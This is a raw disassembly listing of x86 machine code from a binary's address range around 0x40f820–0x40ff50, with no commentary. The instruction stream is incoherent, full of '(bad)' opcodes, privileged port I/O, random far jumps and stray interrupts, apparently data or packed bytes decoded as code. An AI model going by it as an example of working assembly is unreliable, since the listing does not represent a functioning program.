  40f820:	and    DWORD PTR [ebx+0x32],esp
  40f823:	sbb    DWORD PTR [eax+0x32],0xffffffb2
  40f827:	ins    DWORD PTR es:[edi],dx
  40f828:	aam    0x32
  40f82a:	fwait
  40f82b:	mov    ecx,0xae279bbd
  40f830:	xchg   esi,eax
  40f831:	xchg   edi,eax
  40f832:	das    
  40f833:	jo     0x40f886
  40f835:	outs   dx,DWORD PTR ds:[esi]
  40f836:	or     bl,BYTE PTR [esi]
  40f838:	outs   dx,DWORD PTR ds:[esi]
  40f839:	add    cl,BYTE PTR ds:0x2427e569
  40f83f:	jno    0x40f84c
  40f841:	cld    
  40f842:	test   DWORD PTR [eax+0x46cc1b90],edx
  40f848:	push   edx
  40f849:	repnz inc edi
  40f84b:	adc    edx,DWORD PTR [edx-0x4d34c681]
  40f851:	xchg   BYTE PTR [edx-0x5e4cc188],al
  40f857:	mov    eax,0xdd4204f8
  40f85c:	lds    esp,FWORD PTR ds:0x9d8f0422
  40f862:	jg     0x40f7ef
  40f864:	sahf   
  40f865:	mov    ah,0x3a
  40f867:	fsubr  QWORD PTR ds:0xea2259f0
  40f86d:	int    0xf5
  40f86f:	pop    edi
  40f870:	mov    dl,0x2f
  40f872:	and    BYTE PTR [ebx],0x4a
  40f875:	test   BYTE PTR [eax-0x35b22d28],cl
  40f87b:	enter  0xa45c,0x53
  40f87f:	shl    eax,0x76
  40f882:	(bad)  
  40f884:	inc    ebp
  40f885:	jmp    DWORD PTR [edi-0x3a792c9e]
  40f88b:	ins    BYTE PTR es:[edi],dx
  40f88c:	dec    eax
  40f88d:	in     al,dx
  40f88e:	ja     0x40f909
  40f890:	stc    
  40f891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f892:	xchg   esp,eax
  40f893:	jg     0x40f89f
  40f895:	sbb    ecx,edi
  40f897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f898:	sub    eax,0x75181980
  40f89d:	fisubr WORD PTR [eax+0x41fbfd73]
  40f8a3:	icebp  
  40f8a4:	je     0x40f906
  40f8a6:	dec    edi
  40f8a7:	adc    ebp,esp
  40f8a9:	loopne 0x40f8ec
  40f8ab:	int3   
  40f8ac:	push   ebp
  40f8ad:	push   0xfffffff0
  40f8af:	stos   BYTE PTR es:[edi],al
  40f8b0:	icebp  
  40f8b1:	rcl    BYTE PTR [edx],1
  40f8b3:	test   eax,0x1fb60c38
  40f8b8:	icebp  
  40f8b9:	fs jbe 0x40f8bc
  40f8bc:	fsubr  st(1),st
  40f8be:	test   BYTE PTR cs:[edi],dh
  40f8c1:	ret    
  40f8c2:	or     DWORD PTR [ecx+0x191e23b1],eax
  40f8c8:	xor    DWORD PTR [ecx-0x55c25da8],0xc02ed0e4
  40f8d2:	lods   eax,DWORD PTR ds:[esi]
  40f8d3:	add    al,0xdd
  40f8d5:	outs   dx,BYTE PTR ds:[esi]
  40f8d6:	push   ebx
  40f8d7:	jge    0x40f954
  40f8d9:	aaa    
  40f8da:	dec    edx
  40f8db:	mov    ch,0xb9
  40f8dd:	pop    edx
  40f8de:	sbb    al,0xd4
  40f8e0:	pop    es
  40f8e1:	cmp    al,0x6d
  40f8e3:	sub    DWORD PTR [eax+edi*4-0x110cb155],esp
  40f8ea:	xchg   DWORD PTR [esi],edi
  40f8ec:	aaa    
  40f8ed:	outs   dx,DWORD PTR ds:[esi]
  40f8ee:	loopne 0x40f961
  40f8f0:	test   DWORD PTR [ebx+0x683cc4e5],ebp
  40f8f6:	or     eax,0xffffffb5
  40f8f9:	jecxz  0x40f968
  40f8fb:	pop    ebx
  40f8fc:	cmp    dl,BYTE PTR [ecx]
  40f8fe:	lods   eax,DWORD PTR ds:[esi]
  40f8ff:	out    dx,eax
  40f900:	(bad)  
  40f901:	das    
  40f902:	rol    ecx,cl
  40f904:	push   0x8a56998a
  40f909:	sbb    edx,DWORD PTR [eax]
  40f90b:	mov    eax,ds:0x929c145a
  40f910:	call   0x98f2da9f
  40f915:	call   0x1452:0x1cd736b3
  40f91c:	dec    ebx
  40f91d:	enter  0xbb99,0xbe
  40f921:	ja     0x40f8c3
  40f923:	inc    ebp
  40f924:	mov    ecx,0xce0af0cf
  40f929:	inc    eax
  40f92a:	(bad)  
  40f92b:	cmp    eax,0x98b6eeaa
  40f930:	pop    es
  40f931:	sub    al,0xb3
  40f933:	icebp  
  40f934:	jecxz  0x40f976
  40f936:	jns    0x40f8d2
  40f938:	push   edi
  40f939:	push   cs
  40f93a:	xor    cl,BYTE PTR [esi-0x385b4eae]
  40f940:	fld    TBYTE PTR [ebx+0x80a900]
  40f946:	mov    DWORD PTR [esi-0x6a],eax
  40f949:	adc    bl,bl
  40f94b:	mov    edx,edi
  40f94d:	outs   dx,DWORD PTR ds:[esi]
  40f94e:	xchg   BYTE PTR [ebp+0x4e2345e6],ah
  40f954:	jns    0x40f940
  40f956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f957:	mov    BYTE PTR [esp+eiz*2-0x2021bfba],al
  40f95e:	inc    esp
  40f95f:	outs   dx,DWORD PTR ds:[esi]
  40f960:	out    0x8b,al
  40f962:	jae    0x40f92d
  40f964:	cmp    eax,0xba8af166
  40f969:	mov    dl,0xbb
  40f96b:	test   DWORD PTR [eax-0x60217383],0xcd4d4683
  40f975:	mov    eax,0xce2d266
  40f97a:	push   esp
  40f97b:	outs   dx,DWORD PTR ds:[esi]
  40f97c:	cdq    
  40f97d:	fs shl edx,0xe7
  40f981:	gs scas eax,DWORD PTR es:[edi]
  40f983:	jl     0x40f9b0
  40f985:	iret   
  40f986:	push   ss
  40f987:	out    0x45,eax
  40f989:	adc    al,0x75
  40f98b:	inc    edx
  40f98c:	add    BYTE PTR [edi+ebx*1],bl
  40f98f:	stc    
  40f990:	sub    DWORD PTR [edi-0x241fbff0],ebx
  40f996:	dec    edx
  40f997:	xchg   esi,eax
  40f998:	sub    cl,BYTE PTR [esi]
  40f99a:	dec    esp
  40f99b:	(bad)  
  40f99c:	mov    esp,0x84870cd
  40f9a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9a2:	dec    esi
  40f9a3:	dec    ebp
  40f9a4:	xchg   esp,eax
  40f9a5:	enter  0x95ad,0xa7
  40f9a9:	out    dx,al
  40f9aa:	cwde   
  40f9ab:	fcmovnbe st,st(7)
  40f9ad:	xor    eax,0x6aea3391
  40f9b2:	popf   
  40f9b3:	iret   
  40f9b4:	xor    ecx,DWORD PTR [edi+0x5c]
  40f9b7:	mov    dh,0xb8
  40f9b9:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9bb:	mov    edi,0x6274a132
  40f9c0:	mov    bh,0xaa
  40f9c2:	dec    eax
  40f9c3:	xchg   al,cl
  40f9c5:	jl     0x40f9f3
  40f9c7:	cmp    DWORD PTR [edi],ebx
  40f9c9:	in     eax,0x5a
  40f9cb:	loope  0x40fa2a
  40f9cd:	pusha  
  40f9ce:	push   ebx
  40f9cf:	xchg   ebx,eax
  40f9d0:	jb     0x40fa37
  40f9d2:	loop   0x40f95c
  40f9d4:	fs mov eax,0x8f48fd26
  40f9da:	rcl    DWORD PTR [edx],cl
  40f9dc:	ja     0x40fa3c
  40f9de:	cs inc eax
  40f9e0:	scas   al,BYTE PTR es:[edi]
  40f9e1:	mov    ah,0xa2
  40f9e3:	(bad)  
  40f9e4:	out    0x74,eax
  40f9e6:	mov    edx,0xa2766293
  40f9eb:	cmp    esi,edx
  40f9ed:	pop    es
  40f9ee:	arpl   WORD PTR [edi],bp
  40f9f0:	xchg   esp,eax
  40f9f1:	xchg   esp,eax
  40f9f2:	xlat   BYTE PTR ds:[ebx]
  40f9f3:	dec    eax
  40f9f4:	scas   eax,DWORD PTR es:[edi]
  40f9f5:	out    dx,eax
  40f9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9f7:	or     al,BYTE PTR [eax-0x73232c9a]
  40f9fd:	push   eax
  40f9fe:	out    dx,eax
  40f9ff:	jae    0x40fa1a
  40fa01:	les    ebp,FWORD PTR [edx+0x2a]
  40fa04:	cmp    al,0xcc
  40fa06:	sbb    DWORD PTR [ebx+0x4e135569],edi
  40fa0c:	test   DWORD PTR [eax-0x6f],eax
  40fa0f:	pop    ds
  40fa10:	fild   WORD PTR [edx-0x7b]
  40fa13:	jno    0x40fa5b
  40fa15:	out    dx,al
  40fa16:	iret   
  40fa17:	inc    ebp
  40fa18:	mov    BYTE PTR [eax+edx*1],dl
  40fa1b:	das    
  40fa1c:	call   0xa4c5ca54
  40fa21:	xchg   ebx,eax
  40fa22:	adc    DWORD PTR [ebx],eax
  40fa24:	ja     0x40f9f7
  40fa26:	ficomp DWORD PTR [edx+0x2702ed29]
  40fa2c:	leavew 
  40fa2e:	cmp    esp,edx
  40fa30:	test   BYTE PTR [ebp-0x730ddb1c],0x53
  40fa37:	jle    0x40f9fa
  40fa39:	or     BYTE PTR [esi+0x5b],0xd0
  40fa3d:	rcr    ch,cl
  40fa3f:	fidivr DWORD PTR ds:0x70609fff
  40fa45:	xchg   ebx,esi
  40fa47:	mov    gs,edi
  40fa49:	sub    eax,0x7647196e
  40fa4e:	cs (bad) 
  40fa51:	stos   DWORD PTR es:[edi],eax
  40fa52:	les    edx,FWORD PTR [edx]
  40fa54:	bound  eax,QWORD PTR [esi-0x68]
  40fa57:	mov    bl,0x68
  40fa59:	jmp    0xc43eb5e9
  40fa5e:	cmp    BYTE PTR [ebx-0x7b],bh
  40fa61:	xor    ebx,ebx
  40fa63:	ret    0xced6
  40fa66:	fstp   QWORD PTR [ebx]
  40fa68:	in     al,dx
  40fa69:	cmp    DWORD PTR [eax-0x68bae18],esi
  40fa6f:	cdq    
  40fa70:	push   esp
  40fa71:	pop    esi
  40fa72:	mov    al,ds:0x141f9b6c
  40fa77:	xor    ch,BYTE PTR [edi+0x56]
  40fa7a:	cli    
  40fa7b:	jle    0x40fa81
  40fa7d:	cmp    DWORD PTR [ebp-0x36],edx
  40fa80:	ins    BYTE PTR es:[edi],dx
  40fa81:	jecxz  0x40fa67
  40fa83:	pop    ecx
  40fa84:	mov    ebx,0xe38bd129
  40fa89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa8a:	and    ah,BYTE PTR [ebx]
  40fa8c:	push   edx
  40fa8d:	push   0x2e108136
  40fa92:	ja     0x40fa6a
  40fa94:	sbb    eax,0xbe09cfd1
  40fa99:	inc    edx
  40fa9a:	not    BYTE PTR [edi]
  40fa9c:	jecxz  0x40faca
  40fa9e:	pop    ebx
  40fa9f:	mov    bl,BYTE PTR [ecx]
  40faa1:	mov    ch,0x12
  40faa3:	and    bl,BYTE PTR [ecx-0x3b]
  40faa6:	aas    
  40faa7:	ret    
  40faa8:	stos   BYTE PTR es:[edi],al
  40faa9:	les    esp,FWORD PTR [ebx]
  40faab:	ins    BYTE PTR es:[edi],dx
  40faac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faad:	xor    ecx,DWORD PTR [ebp+0x6b]
  40fab0:	fldenv [ecx]
  40fab2:	ret    
  40fab3:	mov    al,ds:0x9da05794
  40fab8:	pop    edx
  40fab9:	sub    DWORD PTR [esi+0x79131260],0x3a
  40fac0:	out    dx,eax
  40fac1:	adc    al,0xf0
  40fac3:	push   edx
  40fac4:	sub    DWORD PTR [ecx+eiz*4],ebp
  40fac7:	jecxz  0x40fad0
  40fac9:	pushf  
  40faca:	and    ah,bh
  40facc:	mov    DWORD PTR [eax-0x3c89a08a],ecx
  40fad2:	outs   dx,DWORD PTR ds:[esi]
  40fad3:	sub    ebx,DWORD PTR [ebx-0x7b51ec7b]
  40fad9:	inc    eax
  40fada:	pop    esp
  40fadb:	and    eax,0x185b22ed
  40fae0:	fwait
  40fae1:	rcr    DWORD PTR [edx+0x7442e7bb],0xb4
  40fae8:	jge    0x40fb18
  40faea:	cmp    eax,0x788a608b
  40faef:	inc    ecx
  40faf0:	pop    ds
  40faf1:	outs   dx,DWORD PTR ds:[esi]
  40faf2:	aaa    
  40faf3:	nop
  40faf4:	packsswb mm4,QWORD PTR [eax+0x3d120a28]
  40fafb:	push   esi
  40fafc:	leave  
  40fafd:	aad    0xa3
  40faff:	sbb    BYTE PTR [ebx],dh
  40fb01:	int    0xe1
  40fb03:	xchg   edi,eax
  40fb04:	arpl   WORD PTR [esi-0x72],ax
  40fb07:	repnz sbb eax,0x30785bf
  40fb0d:	outs   dx,DWORD PTR ds:[esi]
  40fb0e:	or     ecx,edi
  40fb10:	xor    al,0x27
  40fb12:	jmp    0x40fb69
  40fb14:	pusha  
  40fb15:	imul   ebp,ecx,0x3
  40fb18:	xchg   edi,eax
  40fb19:	pushf  
  40fb1a:	mov    bh,0xa2
  40fb1c:	fs mov ebp,0xef8bce8d
  40fb22:	xchg   esi,eax
  40fb23:	dec    edx
  40fb24:	pop    eax
  40fb25:	cmp    dh,BYTE PTR [ebx-0x3a]
  40fb28:	inc    eax
  40fb29:	ret    
  40fb2a:	(bad)  
  40fb2b:	in     al,dx
  40fb2c:	in     eax,dx
  40fb2d:	push   ebx
  40fb2e:	lds    eax,FWORD PTR [ebx+0x69309163]
  40fb34:	push   edx
  40fb35:	(bad)  
  40fb36:	outs   dx,BYTE PTR ds:[esi]
  40fb37:	(bad)  
  40fb38:	jb     0x40fac9
  40fb3a:	in     al,dx
  40fb3b:	cmp    eax,0xf9a676e1
  40fb40:	and    BYTE PTR [ebx-0x5cbab57b],dh
  40fb46:	sbb    dl,BYTE PTR [edi]
  40fb48:	push   esp
  40fb49:	ficomp WORD PTR cs:[edi]
  40fb4c:	xchg   ecx,eax
  40fb4d:	xlat   BYTE PTR ds:[ebx]
  40fb4e:	pop    ecx
  40fb4f:	loope  0x40fb6f
  40fb51:	dec    edx
  40fb52:	(bad)  
  40fb53:	and    DWORD PTR [ecx+0x24],ebp
  40fb56:	push   eax
  40fb57:	enter  0x8d46,0xe7
  40fb5b:	dec    edi
  40fb5c:	div    BYTE PTR [ebx-0x66]
  40fb5f:	hlt    
  40fb60:	dec    edi
  40fb61:	les    eax,FWORD PTR [ecx-0x2a3b80e0]
  40fb67:	leave  
  40fb68:	inc    ebx
  40fb69:	dec    esi
  40fb6a:	stos   DWORD PTR es:[edi],eax
  40fb6b:	jo     0x40fb34
  40fb6d:	int    0x24
  40fb6f:	addr16 sbb al,0x4b
  40fb72:	sub    al,0xbd
  40fb74:	add    edi,ebp
  40fb76:	xor    ebx,DWORD PTR [eax]
  40fb78:	and    al,0xad
  40fb7a:	cmp    eax,0x608748c
  40fb7f:	mov    ebp,0xed7556c5
  40fb84:	repnz push ss
  40fb86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb87:	leave  
  40fb88:	cmc    
  40fb89:	(bad)  
  40fb8a:	xor    al,0x55
  40fb8c:	add    eax,0x5ba3b215
  40fb91:	mov    edi,DWORD PTR ds:0x88a6e032
  40fb97:	mov    bh,0x41
  40fb99:	cmc    
  40fb9a:	test   DWORD PTR [ebp-0x18],ebx
  40fb9d:	pop    esi
  40fb9e:	cmp    ebx,edx
  40fba0:	mov    ds:0x43930ed0,eax
  40fba5:	jnp    0x40fb36
  40fba7:	lods   eax,DWORD PTR ds:[esi]
  40fba8:	enter  0x1121,0xf1
  40fbac:	mul    BYTE PTR [esi-0x2]
  40fbaf:	in     al,0x7a
  40fbb1:	pop    ebp
  40fbb2:	add    DWORD PTR ds:[ebx+0x5f4e4e66],esp
  40fbb9:	nop
  40fbba:	mov    cl,0xe8
  40fbbc:	mov    dh,0xba
  40fbbe:	addr16 push ebx
  40fbc0:	loopne 0x40fc33
  40fbc2:	push   ds
  40fbc3:	daa    
  40fbc4:	in     al,0xae
  40fbc6:	(bad)  
  40fbc7:	retf   
  40fbc8:	pop    ds
  40fbc9:	mov    ds:0x37c6e74e,al
  40fbce:	jp     0x40fbab
  40fbd0:	mov    cl,0x49
  40fbd2:	lods   eax,DWORD PTR ds:[esi]
  40fbd3:	push   0xd5b76d70
  40fbd8:	pop    ebp
  40fbd9:	adc    ebp,DWORD PTR [ecx+ecx*4-0x2]
  40fbdd:	pop    edx
  40fbde:	push   eax
  40fbdf:	and    edx,DWORD PTR [edx+0x4a]
  40fbe2:	sti    
  40fbe3:	jmp    0x9634bf9e
  40fbe8:	add    eax,DWORD PTR [esi]
  40fbea:	mov    ah,0x64
  40fbec:	pop    esp
  40fbed:	stc    
  40fbee:	and    al,0x6f
  40fbf0:	(bad)  
  40fbf2:	mov    edx,0xf7d31d0d
  40fbf7:	out    dx,eax
  40fbf8:	push   ecx
  40fbf9:	push   cs
  40fbfa:	cs push cs
  40fbfc:	jg     0x40fc43
  40fbfe:	sahf   
  40fbff:	ret    
  40fc00:	mov    cl,bh
  40fc02:	dec    ecx
  40fc03:	mov    gs,WORD PTR [edx+0x1abd3ead]
  40fc09:	add    eax,0x4c262fee
  40fc0e:	jbe    0x40fc18
  40fc10:	out    0x34,eax
  40fc12:	add    eax,0xf4f178d
  40fc17:	xor    eax,0x783f3829
  40fc1c:	clc    
  40fc1d:	out    dx,al
  40fc1e:	adc    esi,edi
  40fc20:	ror    al,cl
  40fc22:	pop    ebp
  40fc23:	scas   eax,DWORD PTR es:[edi]
  40fc24:	repz repz pop esi
  40fc27:	push   ebx
  40fc28:	stos   BYTE PTR es:[edi],al
  40fc29:	sbb    ebp,DWORD PTR ds:0x7dcc72da
  40fc2f:	es push 0x10
  40fc32:	sub    ch,BYTE PTR [edx+0xe]
  40fc35:	into   
  40fc36:	outs   dx,DWORD PTR ds:[esi]
  40fc37:	pop    ebp
  40fc38:	mov    ch,0x61
  40fc3a:	jo     0x40fc33
  40fc3c:	mov    ?,WORD PTR [edx]
  40fc3e:	mov    ds:0x9ef04070,al
  40fc43:	fist   DWORD PTR [edi-0x625d08b]
  40fc49:	psubq  mm1,mm2
  40fc4c:	push   ds
  40fc4d:	add    esp,DWORD PTR [eax-0x28]
  40fc50:	fdivp  st(7),st
  40fc52:	dec    esp
  40fc53:	xchg   BYTE PTR [eax+0x1bdee03],dh
  40fc59:	pop    ebp
  40fc5a:	cwde   
  40fc5b:	in     eax,dx
  40fc5c:	mov    edx,0x880e4c0a
  40fc61:	jecxz  0x40fc2a
  40fc63:	imul   esp,DWORD PTR [ebx-0x6e],0xff290c11
  40fc6a:	xor    al,0xe7
  40fc6c:	jge    0x40fc25
  40fc6e:	mov    BYTE PTR [edx+0x7],ch
  40fc71:	and    eax,0x8d0f6bc6
  40fc76:	aad    0xcf
  40fc78:	call   0xc9095c8c
  40fc7d:	mov    dh,0x39
  40fc7f:	pop    eax
  40fc80:	cdq    
  40fc81:	lahf   
  40fc82:	mov    al,ds:0x80143e82
  40fc87:	inc    edi
  40fc88:	xor    eax,DWORD PTR [ebp-0x2c]
  40fc8b:	or     al,0xe1
  40fc8d:	mov    cl,0xf
  40fc8f:	data16 adc dl,BYTE PTR [edi]
  40fc92:	mov    bh,0x86
  40fc94:	nop
  40fc95:	push   0xd74b811d
  40fc9a:	mov    ds:0x49834aa4,al
  40fc9f:	pop    eax
  40fca0:	stos   BYTE PTR es:[edi],al
  40fca1:	sub    eax,0x74dc2e9e
  40fca6:	sbb    al,0xc3
  40fca8:	ds (bad) 
  40fcaa:	stos   DWORD PTR es:[edi],eax
  40fcab:	retf   0x24a6
  40fcae:	mov    ds:0xdaa0c9a4,al
  40fcb3:	std    
  40fcb4:	(bad)  
  40fcb5:	mov    eax,ds:0x755ac879
  40fcba:	cmp    bl,ah
  40fcbc:	lods   eax,DWORD PTR ds:[esi]
  40fcbd:	aad    0x18
  40fcbf:	lock in eax,dx
  40fcc1:	sbb    ecx,DWORD PTR [eax+0x4c8776ea]
  40fcc7:	xchg   ebx,eax
  40fcc8:	mov    DWORD PTR [ebx],edi
  40fcca:	in     al,dx
  40fccb:	mov    esp,0x69c9d45b
  40fcd0:	mov    cl,0x6a
  40fcd2:	sub    al,0xbe
  40fcd4:	fistp  WORD PTR [ecx]
  40fcd6:	(bad)  
  40fcd7:	xchg   ebx,eax
  40fcd8:	scas   eax,DWORD PTR es:[edi]
  40fcd9:	dec    esi
  40fcda:	xlat   BYTE PTR ds:[ebx]
  40fcdb:	mov    cl,0xf5
  40fcdd:	mov    BYTE PTR [ecx-0x7d5d26dc],al
  40fce3:	or     ah,bl
  40fce5:	push   ecx
  40fce6:	push   cs
  40fce7:	inc    ebp
  40fce8:	repz pop esi
  40fcea:	sbb    al,0x5f
  40fcec:	or     DWORD PTR [ebp+0x19],0x2a2bd109
  40fcf3:	push   ebp
  40fcf4:	push   ebp
  40fcf5:	jp     0x40fd46
  40fcf7:	or     ebp,DWORD PTR [edx]
  40fcf9:	jb     0x40fcac
  40fcfb:	push   cs
  40fcfc:	int    0xd
  40fcfe:	stc    
  40fcff:	stos   DWORD PTR es:[edi],eax
  40fd00:	and    BYTE PTR [esi],0x80
  40fd03:	imul   edx,ebp,0xffffff87
  40fd06:	out    0x40,eax
  40fd08:	jmp    0x40fd6e
  40fd0a:	pop    ebp
  40fd0b:	push   0x523d7a2c
  40fd10:	mov    eax,0xc31c8eaf
  40fd15:	(bad)  [ebx]
  40fd17:	mov    eax,0x7a083cec
  40fd1c:	xchg   ebp,eax
  40fd1d:	add    BYTE PTR [edi],bh
  40fd1f:	inc    esi
  40fd20:	push   es
  40fd21:	icebp  
  40fd22:	sbb    BYTE PTR [esp+ebp*1],cl
  40fd25:	sbb    eax,0x40652fd
  40fd2a:	pusha  
  40fd2b:	das    
  40fd2c:	stc    
  40fd2d:	out    dx,eax
  40fd2e:	inc    edi
  40fd2f:	push   ss
  40fd30:	shl    BYTE PTR [edx-0x2356a44b],1
  40fd36:	xchg   edi,eax
  40fd37:	jg     0x40fcc6
  40fd39:	sahf   
  40fd3a:	push   edx
  40fd3b:	sbb    DWORD PTR [edx-0x46],edi
  40fd3e:	and    al,0xed
  40fd40:	jmp    0x7330:0xeb843b16
  40fd47:	(bad)  [eax+ebp*8-0x6795d80f]
  40fd4e:	add    DWORD PTR [eax+0x50b14478],esi
  40fd54:	(bad)  
  40fd56:	ja     0x40fdd3
  40fd58:	mov    eax,ds:0x668546b2
  40fd5d:	in     eax,dx
  40fd5e:	sbb    ch,al
  40fd60:	add    al,0xc4
  40fd62:	cld    
  40fd63:	push   eax
  40fd64:	jmp    0x7354901d
  40fd69:	gs or  bh,ah
  40fd6c:	inc    ebp
  40fd6d:	push   ecx
  40fd6e:	out    0x2a,al
  40fd70:	xchg   edx,eax
  40fd71:	adc    edx,0xc59c6246
  40fd77:	jns    0x40fd20
  40fd79:	(bad)  
  40fd7a:	fsub   DWORD PTR [ebx+0x40]
  40fd7d:	imul   edi,DWORD PTR [esi+0x22],0x62469d4f
  40fd84:	pusha  
  40fd85:	loopne 0x40fdfe
  40fd87:	sub    eax,0xaf016d54
  40fd8c:	call   0x146:0xc19c15c0
  40fd93:	xchg   ebx,eax
  40fd94:	pop    esp
  40fd95:	popa   
  40fd96:	test   BYTE PTR [edi-0x61],cl
  40fd99:	neg    DWORD PTR [edx+0x50793969]
  40fd9f:	cdq    
  40fda0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fda1:	rcr    DWORD PTR [ecx-0x6c],cl
  40fda4:	mov    ds:0xd70ce81d,eax
  40fda9:	in     al,dx
  40fdaa:	push   edi
  40fdab:	push   0x70
  40fdad:	test   al,0xd4
  40fdaf:	mov    edi,DWORD PTR [eax+0x2c]
  40fdb2:	and    al,0x9c
  40fdb5:	xor    eax,0xe1e828b5
  40fdba:	cmp    BYTE PTR [ecx+0x331691b7],ch
  40fdc0:	jle    0x40fdee
  40fdc2:	test   DWORD PTR [edi],ebp
  40fdc4:	mov    al,0x26
  40fdc6:	ret    0xaa14
  40fdc9:	mov    ah,0x1d
  40fdcb:	dec    BYTE PTR [edx]
  40fdcd:	pop    es
  40fdce:	ss pusha 
  40fdd0:	mov    dl,0x4d
  40fdd2:	push   ecx
  40fdd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdd4:	(bad)  
  40fdd5:	in     al,0x7a
  40fdd7:	iret   
  40fdd8:	dec    esi
  40fdd9:	js     0x40fe4a
  40fddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fddc:	sbb    BYTE PTR [edx+0x5a5daa0f],dl
  40fde2:	out    0x81,al
  40fde4:	das    
  40fde5:	inc    ecx
  40fde6:	and    DWORD PTR [ebp-0x13e616fb],esi
  40fdec:	imul   esp,DWORD PTR [eax-0x24352c5c],0x7fa3cc23
  40fdf6:	jo     0x40fdcc
  40fdf8:	jp     0x40fe40
  40fdfa:	xchg   ecx,eax
  40fdfb:	xor    ch,0x81
  40fdfe:	mov    ds:0xe82a1949,al
  40fe03:	inc    ebx
  40fe04:	cmp    al,0x42
  40fe06:	mov    WORD PTR [esi],cs
  40fe08:	call   0x1f05:0xb32ae819
  40fe0f:	jne    0x40fdd4
  40fe11:	inc    esp
  40fe12:	rcl    BYTE PTR [eax+eiz*2+0x3d66eb1e],1
  40fe19:	inc    edx
  40fe1a:	mov    edx,0xc2f152bd
  40fe1f:	push   cs
  40fe20:	cmp    al,0x6e
  40fe22:	call   0xf08d6404
  40fe27:	iret   
  40fe28:	sahf   
  40fe29:	mov    edx,0x36981e0c
  40fe2e:	repz out dx,eax
  40fe30:	xor    al,0xe5
  40fe32:	daa    
  40fe33:	or     DWORD PTR [edx-0x7a899aa5],ebx
  40fe39:	daa    
  40fe3a:	cmp    BYTE PTR [ebp+0x73],bh
  40fe3d:	push   ebx
  40fe3e:	retf   
  40fe3f:	sbb    BYTE PTR [esi+0x7e7d7a8f],bl
  40fe45:	nop
  40fe46:	mov    dl,0x1b
  40fe48:	fsubr  st,st(2)
  40fe4a:	xchg   ebp,ebp
  40fe4c:	jo     0x40fdfe
  40fe4e:	and    BYTE PTR [eax-0x328d5a63],0xce
  40fe55:	cs enter 0xac97,0x22
  40fe5a:	xor    al,0xc6
  40fe5c:	dec    ebp
  40fe5d:	mov    ah,0x5c
  40fe5f:	dec    edx
  40fe60:	(bad)  
  40fe61:	push   0x59f501b7
  40fe66:	xchg   edx,eax
  40fe67:	pop    ebx
  40fe68:	push   ebp
  40fe69:	ficomp DWORD PTR ds:0xda66efbc
  40fe6f:	mov    edx,0x9058f33f
  40fe74:	scas   eax,DWORD PTR es:[edi]
  40fe75:	ins    DWORD PTR es:[edi],dx
  40fe76:	lahf   
  40fe77:	imul   eax,DWORD PTR [ecx],0xffffff91
  40fe7a:	cmc    
  40fe7b:	(bad)  
  40fe7c:	jnp    0x40fec9
  40fe7e:	sub    eax,0x52c9e39b
  40fe83:	aad    0xba
  40fe85:	mov    eax,0x166b2aff
  40fe8a:	jns    0x40ff03
  40fe8c:	jbe    0x40fe98
  40fe8e:	xor    eax,0xebedcbd8
  40fe93:	jmp    0x4db2:0x2a718576
  40fe9a:	add    DWORD PTR [ebx+0x6d],esp
  40fe9d:	push   edx
  40fe9e:	xchg   DWORD PTR [eax-0x10a5c10f],edx
  40fea4:	test   BYTE PTR [edi+ebp*8-0x44],ah
  40fea8:	xor    eax,0x37d13749
  40fead:	sub    ecx,ecx
  40feaf:	lea    edx,[esi+eax*4-0x56f61492]
  40feb6:	mov    dl,0xfd
  40feb8:	jl     0x40fe3d
  40feba:	and    eax,0xf2afff6a
  40febf:	add    ch,dh
  40fec1:	std    
  40fec2:	test   eax,0x194d119c
  40fec7:	push   ebp
  40fec8:	or     DWORD PTR [edx+eiz*2-0x753a18c3],edx
  40fecf:	mov    bh,0xd
  40fed1:	push   edi
  40fed2:	(bad)  
  40fed4:	pop    es
  40fed5:	add    bh,BYTE PTR [eax+0x623b12af]
  40fedb:	iret   
  40fedc:	addr16 dec esi
  40fede:	shr    BYTE PTR [ecx+0x6a],0x7a
  40fee2:	scas   eax,DWORD PTR es:[edi]
  40fee3:	fs xchg ebp,eax
  40fee5:	loop   0x40ff04
  40fee7:	imul   esp,DWORD PTR [ebp+edx*8+0x63897dcf],0x9c1e9027
  40fef2:	js     0x40ff4c
  40fef4:	bound  esp,QWORD PTR [ebx-0x7e]
  40fef7:	js     0x40fea9
  40fef9:	cmp    DWORD PTR [eax+0x7e],ebp
  40fefc:	aam    0x54
  40fefe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feff:	iret   
  40ff00:	cdq    
  40ff01:	or     DWORD PTR [ebp-0x2dddb804],edx
  40ff07:	add    dh,bh
  40ff09:	sbb    BYTE PTR [esi],dl
  40ff0b:	test   BYTE PTR [edx],dl
  40ff0d:	push   ecx
  40ff0e:	push   0x70b7d1d
  40ff13:	xor    ebx,DWORD PTR [edi-0x4b135193]
  40ff19:	sub    DWORD PTR [ecx-0x1],eax
  40ff1c:	das    
  40ff1d:	stos   BYTE PTR es:[edi],al
  40ff1e:	and    al,BYTE PTR ds:0xe60727dd
  40ff24:	outs   dx,BYTE PTR ds:[esi]
  40ff25:	scas   eax,DWORD PTR es:[edi]
  40ff26:	mov    bl,0x5f
  40ff28:	retf   0x5a4c
  40ff2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff2c:	retf   0x84f3
  40ff2f:	hlt    
  40ff30:	push   eax
  40ff31:	sbb    esp,DWORD PTR [edi]
  40ff33:	(bad)  
  40ff37:	test   BYTE PTR [eax+0x73],cl
  40ff3a:	cmp    DWORD PTR [ebp+0x6a6a4fff],ecx
  40ff40:	push   ebx
  40ff41:	mov    eax,ds:0x7a4bd4ab
  40ff46:	daa    
  40ff47:	fisubr WORD PTR [esi+ecx*4-0x1f8f6c37]
  40ff4e:	clc    
  40ff4f:	outs   dx,DWORD PTR ds:[esi]
  40ff50:	inc    ebp
